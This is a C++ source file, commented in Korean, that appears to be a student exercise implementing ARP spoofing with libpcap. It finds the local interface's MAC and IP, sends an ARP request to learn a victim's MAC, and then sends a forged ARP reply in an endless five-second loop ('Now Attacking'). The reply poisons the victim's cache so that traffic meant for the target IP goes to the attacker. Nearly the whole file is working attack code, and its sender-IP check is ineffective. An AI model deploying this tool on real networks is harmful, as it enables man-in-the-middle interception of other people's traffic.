#include <cstdio>
#include <pcap.h>
#include <string.h>
#include <string>
#include <stdlib.h> 
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <net/if.h>
#include <netdb.h>
#include <ifaddrs.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include "eth_hdr.h"
#include "arp_hdr.h"

struct EthArpPacket {
	eth_hdr eth;
	arp_hdr arp;
};

int* split(int* tip, char argv[])
{
    char* token = strtok(argv, ".");
    int i = 0;
    while (token != NULL && i < 4) {
        tip[i++] = atoi(token);
        token = strtok(NULL, ".");
    }
    return tip;
}


int main(int argc, char* argv[]) {

	if (argc < 3 || argc%2 != 0) {
    fprintf(stderr, "Usage: %s <interface> <sender-ip> <target-ip>\n", argv[0]);
    return EXIT_FAILURE;
}


	// 1-1. 나의 MAC 알아오기

	int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        perror("Failed to create socket");
        return 1;
    }

    // 인터페이스 이름 설정
    char* ifname = argv[1];

    // 인터페이스 정보 구조체 생성
    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, ifname, IFNAMSIZ - 1);

    // MAC 주소 가져오기
    if (ioctl(sockfd, SIOCGIFHWADDR, &ifr) < 0) {
        perror("Failed to get MAC address");
        return 1;
    }

    // MAC 주소 저장
    unsigned char *mymac = (unsigned char*) ifr.ifr_hwaddr.sa_data;

    close(sockfd);

	// 1-2. 나의 IP 알아오기
	struct ifaddrs *ifaddr, *ifa;
    int family, s;
    char myip[NI_MAXHOST] = {0};  // 여기에 wlan0의 IP를 저장

    if (getifaddrs(&ifaddr) == -1) {
        perror("getifaddrs");
        exit(EXIT_FAILURE);
    }

    for (ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next) {
        if (ifa->ifa_addr == NULL)
            continue;

        family = ifa->ifa_addr->sa_family;

        if (family == AF_INET) { 
            if (strcmp(ifa->ifa_name, argv[1]) == 0) {
                s = getnameinfo(ifa->ifa_addr, sizeof(struct sockaddr_in),
                                myip, NI_MAXHOST, NULL, 0, NI_NUMERICHOST);
                if (s != 0) {
                    printf("getnameinfo() failed: %s\n", gai_strerror(s));
                    freeifaddrs(ifaddr);
                    exit(EXIT_FAILURE);
                }

                break;
            }
        }
    }

    freeifaddrs(ifaddr);

    // 만약 myip를 다른 곳에서 쓴다면 여기서 확인
    // printf("My IP: %s\n", myip);
	// 2. sender의 MAC 알아오기

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* pcap = pcap_open_live(dev, 0, 0, 0, errbuf);
	if (pcap == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return EXIT_FAILURE;
	}
	
	int vip_arr[4];
	int *vip = split(vip_arr, argv[2]);
	int mip_arr[4];
	int *mip = split(mip_arr, myip);

	EthArpPacket packet;
	EthArpPacket attackPacket;

	for(int i=0; i<6; i++){
		packet.eth.smac[i]=mymac[i];
		packet.eth.dmac[i]=0xFF;
		packet.arp.smac[i]=mymac[i];
		packet.arp.tmac[i]=0x00;
	}

	for(int i=0; i<4; i++){
	packet.arp.sip[i] = mip[i];
	packet.arp.tip[i] = vip[i];
	}


	packet.eth.ethType = htons(0x0806);

	packet.arp.HType = htons(0x0001);
	packet.arp.PType = htons(0x0800);
	packet.arp.HLen = 0x06;
	packet.arp.PLen = 0x04;
	packet.arp.Oper = htons(0x0001);

		pcap_t* res_pcap = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
		int cnt = 0;
		while(true){
		
		// arp request
		if(cnt%5 ==0){
			printf("패킷 전송\n");
			int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
			if (res != 0) {
				fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
			}
		}

		printf("돌아가는 중\n");

		// arp response
		struct pcap_pkthdr *header;
		const u_char *data;
		
		int res_arp = pcap_next_ex(res_pcap, &header, &data);
		
		if(res_arp != 1)
		{
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res_arp, pcap_geterr(res_pcap));
		}

		const EthArpPacket* res_packet = reinterpret_cast<const EthArpPacket*>(data);

		const eth_hdr* eth = reinterpret_cast<const eth_hdr*>(data);
		if (ntohs(res_packet->eth.ethType) != 0x0806) continue;
		if (ntohs(res_packet->arp.Oper) != 0x0002) continue;

		for(int i=0; i<4; i++){
			// if(res_packet->arp.tip[i] != mip[i] || res_packet->arp.sip[i] != vip[i]) continue;
			if(res_packet->arp.sip[i] != vip[i]) continue;
		}

		for(int i=0; i<6; i++)
		{
			attackPacket.eth.dmac[i] = res_packet->arp.smac[i];
			attackPacket.eth.smac[i] = mymac[i];
			attackPacket.arp.tmac[i] = res_packet->arp.smac[i];
			attackPacket.arp.smac[i] = mymac[i];
		}
			pcap_close(pcap);
			break;
		
		}
		
		pcap_close(res_pcap);


		// 3. 공격 패킷 구성
		attackPacket.eth.ethType = htons(0x0806);

		int gip_arr[4];
		int *gip = split(gip_arr, argv[3]);

		for(int i=0; i<4; i++){
			attackPacket.arp.sip[i] = gip[i];
			attackPacket.arp.tip[i]=vip[i];
		}

		attackPacket.arp.HType = htons(0x0001);
		attackPacket.arp.PType = htons(0x0800);
		attackPacket.arp.HLen = 0x06;
		attackPacket.arp.PLen = 0x04;
		attackPacket.arp.Oper = htons(0x0002);

		// 4. 공격 패킷 전송
	pcap_t* attack_pcap = pcap_open_live(dev, 0, 0, 0, errbuf);
	if (pcap == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return EXIT_FAILURE;
	}

	while(true)
	{
	printf("Now Attacking\n");
	int attack_res = pcap_sendpacket(attack_pcap, reinterpret_cast<const u_char*>(&attackPacket), sizeof(EthArpPacket));
	if (attack_res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", attack_res, pcap_geterr(attack_pcap));
	}
	sleep(5);
	}

	// pcap_close(attack_pcap);

}
